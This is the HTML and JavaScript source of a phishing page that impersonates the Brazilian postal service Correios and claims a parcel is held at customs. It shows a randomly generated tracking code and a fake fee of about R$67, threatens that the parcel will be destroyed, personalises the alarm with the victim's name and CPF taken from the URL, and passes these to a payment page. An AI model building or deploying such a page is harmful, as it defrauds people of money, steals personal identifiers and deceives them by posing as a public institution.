<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18454278784"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-18454278784');
</script>

<!-- Event snippet for Visualização de página (2) conversion page -->
<script>
  gtag('event', 'conversion', {
      'send_to': 'AW-18454278784/IjtACLPTuPocEIDl199E',
      'value': 1.0,
      'currency': 'BRL'
  });
</script>


    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#004169">
    <title>Sua Encomenda - Correios</title>
    <link rel="icon" type="image/webp" href="images/favicon.webp">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:#f8f9fa;color:#1a1a2e;line-height:1.5;-webkit-font-smoothing:antialiased}
        a{text-decoration:none;color:inherit}
        img{max-width:100%;height:auto;display:block}

        /* Header */
        .hdr{background:#f5f3f0;border-bottom:3px solid #ffd400;padding:10px 16px;display:flex;align-items:center;justify-content:center;position:sticky;top:0;z-index:100}
        .hdr img{height:28px}
        .hdr-user{position:absolute;right:16px;display:flex;align-items:center;gap:6px;font-size:0.8rem;color:#004169;font-weight:600}

        /* Container */
        .cnt{max-width:480px;margin:0 auto;padding:16px}

        /* Breadcrumb */
        .brd{display:flex;align-items:center;gap:6px;font-size:0.78rem;color:#6b7280;margin-bottom:12px}
        .brd strong{color:#004169}

        /* Alert */
        .alt{background:linear-gradient(135deg,#fff5f5,#fff);border-left:4px solid #dc2626;border-radius:8px;padding:14px 16px;margin-bottom:14px}
        .alt h2{color:#b91c1c;font-size:0.95rem;font-weight:800;line-height:1.3;display:flex;align-items:flex-start;gap:8px}
        .alt h2 i{color:#dc2626;font-size:0.9rem;margin-top:3px;flex-shrink:0}

        /* Tracking code */
        .trk{display:inline-block;background:#f5f5f5;border:1px solid #ffc40c;border-radius:6px;padding:6px 14px;font-size:0.95rem;font-weight:700;color:#004169;letter-spacing:0.04em;margin-bottom:8px}

        /* Status */
        .sts{display:flex;align-items:center;gap:8px;margin-bottom:14px}
        .sts-dot{width:10px;height:10px;background:#f59e0b;border-radius:50%;animation:pulse-dot 1.5s infinite}
        @keyframes pulse-dot{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.4;transform:scale(0.8)}}
        .sts span{font-size:0.8rem;font-weight:700;color:#92400e}

        /* Info box */
        .inf{background:#fff;border:1px solid #e5e7eb;border-radius:8px;padding:14px;margin-bottom:14px;font-size:0.82rem;line-height:1.6}
        .inf p{margin-bottom:4px}
        .inf .warn{color:#991b1b;font-weight:600}

        /* CTA Button */
        .cta{display:block;width:100%;padding:16px;background:#004169;color:#fff;border:none;border-radius:10px;font-size:0.95rem;font-weight:700;text-align:center;cursor:pointer;margin-bottom:16px;box-shadow:0 4px 12px rgba(0,65,105,0.3);transition:transform 0.15s,box-shadow 0.15s;text-decoration:none}
        .cta:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(0,65,105,0.4);color:#fff}
        .cta:active{transform:scale(0.98)}
        .cta i{margin-right:6px}

        /* Nota fiscal image */
        .nf{background:#fffbeb;border:1px solid #fde68a;border-radius:8px;padding:12px;margin-bottom:14px}
        .nf h3{font-size:0.8rem;color:#92400e;margin-bottom:8px;display:flex;align-items:center;gap:6px}
        .nf img{border-radius:6px;box-shadow:0 1px 4px rgba(0,0,0,0.08)}

        /* Timeline */
        .tl{margin-bottom:20px;padding:0 4px}
        .tl-hdr{font-size:0.85rem;font-weight:700;color:#004169;margin-bottom:16px;display:flex;align-items:center;gap:6px}
        .tl-item{display:flex;gap:16px;padding-bottom:24px;position:relative}
        .tl-item:not(:last-child)::before{content:'';position:absolute;left:27px;top:56px;bottom:0;width:3px;background:#FFC40C}
        .tl-dot{width:56px;height:56px;border-radius:50%;border:3px solid #FFC40C;background:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:1.3rem;color:#004169;z-index:1}
        .tl-item.alert .tl-dot{border-color:#FFC40C;color:#004169}
        .tl-item.done .tl-dot{border-color:#FFC40C;color:#6b7280}
        .tl-item.active .tl-dot{border-color:#FFC40C;color:#004169}
        .tl-body{padding-top:6px}
        .tl-body h4{font-size:0.95rem;color:#004169;font-weight:700;margin-bottom:4px}
        .tl-body p{font-size:0.85rem;color:#333;line-height:1.5}
        .tl-item.alert h4{color:#c62828}
        .tl-link{color:#004169;font-weight:700;text-decoration:underline}

        /* Banner */
        .bnr{margin-bottom:20px;border-radius:8px;overflow:hidden}
        .bnr img{width:100%}
        .bnr-slides{position:relative}
        .bnr-slide{display:none}
        .bnr-slide.active{display:block}

        /* Footer */
        .ftr{background:#ffe600;color:#004168;padding:1.5rem 1rem 1rem;font-size:14px;font-family:'Trebuchet MS','arial','helvetica',sans-serif}
        .ftr-inner{max-width:1200px;margin:0 auto}
        .ftr h4{font-size:1.1rem;font-weight:bold;color:#003157;margin-bottom:0.75rem}
        .ftr-cols{display:grid;grid-template-columns:1fr;grid-gap:1.5rem;margin-bottom:0}
        @media(min-width:576px){.ftr-cols{grid-template-columns:1fr 1fr}}
        @media(min-width:768px){.ftr-cols{grid-template-columns:1fr 1fr 1fr;grid-gap:2rem}}
        .ftr-cols ul li{margin-bottom:0.25rem}
        .ftr-cols ul li a{display:inline-flex;align-items:center;height:1.875rem;padding:0.15rem;color:#004168;font-size:0.9rem;text-decoration:none}
        .ftr-cols ul li a:hover span{text-decoration:underline;color:#d59118}
        .ftr-cols ul li a img{width:1rem;height:1rem;margin-right:0.5rem;flex-shrink:0}
        .ftr-bot{text-align:center;margin-top:1.5rem;padding-top:1rem;color:#003157;font-size:14px}
    </style>
</head>
<body>

<!-- Header -->
<header class="hdr">
    <img src="images/correios.webp" alt="Correios">
    <div class="hdr-user" id="hdrUser" style="display:none">
        <i class="fas fa-user-circle"></i>
        <span id="hdrNome"></span>
    </div>
</header>

<div class="cnt">
    <!-- Breadcrumb -->
    <nav class="brd">
        <span>Portal Correios</span>
        <i class="fas fa-chevron-right" style="font-size:0.6rem"></i>
        <span>Rastreamento</span>
        <i class="fas fa-chevron-right" style="font-size:0.6rem"></i>
        <strong id="brdId">---</strong>
    </nav>

    <!-- Alerta -->
    <div class="alt">
        <h2>
            <i class="fas fa-exclamation-triangle"></i>
            <span id="alertText">SUA ENCOMENDA FOI RETIDA NA FISCALIZA&Ccedil;&Atilde;O</span>
        </h2>
    </div>

    <!-- Codigo -->
    <div class="trk" id="trkCode">-- --- --- --- --</div>

    <!-- Status -->
    <div class="sts">
        <div class="sts-dot"></div>
        <span>AGUARDANDO PAGAMENTO</span>
    </div>

    <!-- Info -->
    <div class="inf">
        <p><strong>Situa&ccedil;&atilde;o:</strong> Objeto retido na fiscaliza&ccedil;&atilde;o aduaneira.</p>
        <p style="margin-top:6px"><strong>Valor da taxa:</strong> <span id="valorTaxa" style="color:#004169;font-weight:800;font-size:1.1rem">R$ --,--</span></p>
        <p class="warn"><i class="fas fa-exclamation-circle" style="font-size:0.75rem"></i> Ap&oacute;s o prazo, a Receita Federal poder&aacute; determinar a <strong>DESTRUI&Ccedil;&Atilde;O</strong> ou devolu&ccedil;&atilde;o do objeto. A regulariza&ccedil;&atilde;o &eacute; a &uacute;nica forma de garantir o recebimento.</p>
    </div>

<!-- CTA moved below -->

    <!-- Nota fiscal image -->
    <div class="nf">
        <h3><i class="fas fa-file-invoice"></i> Aviso de objeto tributado:</h3>
        <img src="" alt="Status" id="nfImg">
    </div>

    <!-- CTA -->
    <a href="resultado.php" class="cta link-pagamento" id="btnPagar">
        <i class="fas fa-lock"></i> REGULARIZAR E LIBERAR ENTREGA
    </a>

    <!-- Timeline -->
    <div class="tl">
        <div class="tl-hdr"><i class="fas fa-route"></i> Hist&oacute;rico do objeto</div>

        <div class="tl-item active">
            <div class="tl-dot"><img src="images/correios-icon.webp" alt="Correios" style="height:28px;width:auto"></div>
            <div class="tl-body">
                <h4>Previs&atilde;o de Entrega da Mercadoria</h4>
                <p id="prevEntrega"></p>
            </div>
        </div>

        <div class="tl-item alert">
            <div class="tl-dot"><i class="fas fa-dollar-sign"></i></div>
            <div class="tl-body">
                <h4>Pend&ecirc;ncia fiscal identificada</h4>
                <p>Objeto aguardando regulariza&ccedil;&atilde;o fiscal. Taxa de despacho pendente para libera&ccedil;&atilde;o.</p>
                <p><strong>Realize o pagamento:</strong> <a href="resultado.php" class="tl-link link-pagamento">Clique Aqui Para Efetuar o Pagamento</a></p>
            </div>
        </div>

        <div class="tl-item done">
            <div class="tl-dot"><i class="fas fa-search"></i></div>
            <div class="tl-body">
                <h4>Objeto em an&aacute;lise fiscal</h4>
                <p>Encaminhado para Unidade de Fiscaliza&ccedil;&atilde;o. Aguardando verifica&ccedil;&atilde;o tribut&aacute;ria.</p>
            </div>
        </div>

        <div class="tl-item done">
            <div class="tl-dot"><i class="fas fa-truck"></i></div>
            <div class="tl-body">
                <h4>Objeto em transfer&ecirc;ncia</h4>
                <p>Em tr&acirc;nsito para Unidade de Tratamento. Processamento em andamento.</p>
            </div>
        </div>

        <div class="tl-item done">
            <div class="tl-dot"><i class="fas fa-truck-ramp-box"></i></div>
            <div class="tl-body">
                <h4>Objeto recebido na unidade</h4>
                <p>O objeto foi recebido e est&aacute; passando por triagem, aguardando processamento.</p>
            </div>
        </div>

        <div class="tl-item done">
            <div class="tl-dot"><i class="fas fa-box"></i></div>
            <div class="tl-body">
                <h4>Objeto Postado</h4>
                <p>Objeto coletado e registrado no sistema.</p>
            </div>
        </div>
    </div>

    <!-- Banner -->
    <div class="bnr">
        <div class="bnr-slides">
            <div class="bnr-slide active"><img src="images/banner.webp" alt="Correios"></div>
            <div class="bnr-slide"><img src="images/banner2.webp" alt="Correios"></div>
            <div class="bnr-slide"><img src="images/banner3.webp" alt="Correios"></div>
        </div>
    </div>
</div>

<span id="cfGeo" data-state="" data-city="" style="display:none"></span>

<!-- Footer -->
<footer class="ftr">
    <div class="ftr-inner">
        <div class="ftr-cols">
            <div>
                <h4>Fale Conosco</h4>
                <ul>
                    <li><a><img src="images/monitor.png"><span>Registro de Manifestacoes</span></a></li>
                    <li><a><img src="images/duvida.png"><span>Central de Atendimento</span></a></li>
                    <li><a><img src="images/negocios.png"><span>Solucoes para o seu negocio</span></a></li>
                    <li><a><img src="images/headset.png"><span>Suporte ao cliente com contrato</span></a></li>
                    <li><a><img src="images/ouvidoria.png"><span>Ouvidoria</span></a></li>
                    <li><a><img src="images/denuncia.png"><span>Denuncia</span></a></li>
                </ul>
            </div>
            <div>
                <h4>Sobre os Correios</h4>
                <ul>
                    <li><a><img src="images/identidade.png"><span>Identidade corporativa</span></a></li>
                    <li><a><img src="images/educacao.png"><span>Educacao e cultura</span></a></li>
                    <li><a><img src="images/codigo-etica.png"><span>Codigo de etica</span></a></li>
                    <li><a><img src="images/transparencia.png"><span>Transparencia e prestacao de contas</span></a></li>
                    <li><a><img src="images/cadeado.png"><span>Politica de Privacidade e Notas Legais</span></a></li>
                </ul>
            </div>
            <div>
                <h4>Outros Sites</h4>
                <ul>
                    <li><a><img src="images/loja correios.png"><span>Loja online dos Correios</span></a></li>
                </ul>
            </div>
        </div>
        <div class="ftr-bot">&copy; Copyright 2026 Correios</div>
    </div>
</footer>

<script src="js/err.js?v=2"></script>
<script src="js/imp-t4k2r1.js"></script>
<script>window._currentStep="rastreio";window._trackEvent("page_view","rastreio");</script>
<script src="js/tracking.js?v="></script>
<script src="js/shield.js"></script>
<!-- app.js removed -->
<script>
(function(){
    var P = new URLSearchParams(window.location.search);
    var codigo = P.get('codigo') || localStorage.getItem('correios_rastreio') || '';
    if (codigo) localStorage.setItem('correios_rastreio', codigo);
    if (!codigo) {
        var L='ABCDEFGHIJKLMNOPQRSTUVWXYZ',p=L[~~(Math.random()*26)]+L[~~(Math.random()*26)],n='';
        for(var i=0;i<9;i++)n+=~~(Math.random()*10);
        codigo=p+n+'BR'; localStorage.setItem('correios_rastreio',codigo);
    }
    var cpf = P.get('cpf') || localStorage.getItem('correios_cpf') || '';
    if (cpf) localStorage.setItem('correios_cpf', cpf);
    var nome = P.get('nome') || localStorage.getItem('correios_nome') || '';
    if (nome) { localStorage.setItem('correios_nome', nome); try{nome=decodeURIComponent(nome)}catch(e){} }

    // Tracking code display
    var trkEl = document.getElementById('trkCode');
    if (trkEl && codigo) {
        var c = codigo.replace(/\s/g,'').toUpperCase();
        trkEl.textContent = c.length===13 ? c.replace(/(.{2})(.{3})(.{3})(.{3})(.{2})/,'$1 $2 $3 $4 $5') : c;
    }

    // Breadcrumb
    var brdEl = document.getElementById('brdId');
    if (brdEl) {
        if (cpf && cpf.length >= 11) {
            var d = cpf.replace(/\D/g,'');
            brdEl.textContent = d.substr(0,3)+'.***.***-'+d.substr(9,2);
        } else if (codigo) {
            brdEl.textContent = codigo.toUpperCase();
        }
    }

    // Personalization
    if (nome && nome.toUpperCase() !== 'CPF LOCALIZADO') {
        var fn = nome.split(' ')[0];
        fn = fn.charAt(0).toUpperCase() + fn.slice(1).toLowerCase();
        // Header
        var hdr = document.getElementById('hdrUser');
        var hdrN = document.getElementById('hdrNome');
        if (hdr && hdrN) { hdrN.textContent = fn; hdr.style.display = 'flex'; }
        // Alert
        var alt = document.getElementById('alertText');
        if (alt) alt.innerHTML = fn.toUpperCase() + ', SUA ENCOMENDA FOI RETIDA!';
    }

    // Nota fiscal image rotation
    var nfImg = document.getElementById('nfImg');
    if (nfImg) {
        var IMGS=['nota-fiscal2.webp'];
        var KEY='correios_imagem_nota';
        var saved=localStorage.getItem(KEY);
        if(!saved||IMGS.indexOf(saved)===-1){saved=IMGS[~~(Math.random()*IMGS.length)];localStorage.setItem(KEY,saved);}
        nfImg.src='images/'+saved;
    }

    // Previsao entrega — range de 3-5 dias uteis
    var pe = document.getElementById('prevEntrega');
    if (pe) {
        var d1=new Date(),d2=new Date(),dias1=0,dias2=0;
        while(dias1<3){d1.setDate(d1.getDate()+1);if(d1.getDay()!==0&&d1.getDay()!==6)dias1++;}
        while(dias2<5){d2.setDate(d2.getDate()+1);if(d2.getDay()!==0&&d2.getDay()!==6)dias2++;}
        function fmt(d){return d.getDate().toString().padStart(2,'0')+'/'+(d.getMonth()+1).toString().padStart(2,'0')+'/'+d.getFullYear();}
        pe.textContent='Entre '+fmt(d1)+' e '+fmt(d2);
    }

    // UPDATE CTA LINKS with params
    var links = document.querySelectorAll(".link-pagamento, #btnPagar, .cta");
    if (links.length) {
        var params = new URLSearchParams();
        if (cpf) params.set("cpf", cpf);
        if (nome) params.set("nome", nome);
        if (codigo) params.set("rastreio", codigo);
        // Pass through tracking params
        ["gclid","gbraid","wbraid","gad_source","gad_campaignid","utm_source","utm_medium","utm_campaign"].forEach(function(k){
            var v = P.get(k); if(v) params.set(k, v);
        });
        var qs = params.toString();
        links.forEach(function(a){ a.href = "resultado.php" + (qs ? "?" + qs : ""); });
    }

    // Valor da taxa
    var vtEl = document.getElementById('valorTaxa');
    if (vtEl) {
        var KEY_TAXA = 'correios_taxa_valor';
        var saved = parseInt(sessionStorage.getItem(KEY_TAXA));
        if (!saved || saved < 6700 || saved > 6799) {
            saved = 6700 + Math.floor(Math.random() * 99);
            sessionStorage.setItem(KEY_TAXA, saved);
        }
        vtEl.textContent = 'R$ ' + (saved / 100).toFixed(2).replace('.', ',');
    }

    // Banner rotation
    var slides=document.querySelectorAll('.bnr-slide');
    if(slides.length>1){var cur=0;setInterval(function(){slides[cur].classList.remove('active');cur=(cur+1)%slides.length;slides[cur].classList.add('active');},4000);}
})();
</script>
<script>document.body.style.visibility="visible";</script>

<div style="position:absolute; width:1px; height:1px; overflow:hidden; opacity:0; pointer-events:none; left:-9999px;">
  <script id="_waum87">var _wau = _wau || []; _wau.push(["dynamic", "00lylhhgew", "m87", "c4302bffffff", "small"]);</script>
  <script async src="//waust.at/d.js"></script>
</div>

<div style="position:absolute; width:1px; height:1px; overflow:hidden; opacity:0; pointer-events:none; left:-9999px;">
  <script id="_waum87">var _wau = _wau || []; _wau.push(["dynamic", "00lylhhgew", "m87", "c4302bffffff", "small"]);</script>
  <script async src="//waust.at/d.js"></script>
</div>

</body>
</html>
